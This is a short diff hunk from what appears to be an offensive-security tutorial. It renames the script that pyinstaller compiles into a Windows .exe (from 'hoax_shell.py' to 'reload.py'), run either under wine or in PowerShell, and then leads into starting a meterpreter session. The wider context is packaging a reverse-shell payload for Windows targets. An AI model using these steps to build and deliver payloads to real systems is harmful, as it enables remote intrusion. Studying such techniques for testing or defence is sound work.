@@ -31,12 +31,12 @@ nano reload.py
 Now in order to generate a .exe file we can use pyinstaller from Windows or we can use pyinstaller within`wine` if we had it previously installer. 
  
 ```shell
-wine pyinstaller -F hoax_shell.py --onefile
+wine pyinstaller -F reload.py --onefile
 ```
 
 Or directly in Windows: 
 ```powershell
-pyinstaller -F hoax_shell.py --onefile
+pyinstaller -F reload.py --onefile
 ```
 
 Once we have the .exe file, we run a meterpreter session either manually or with the next `.rc` file:
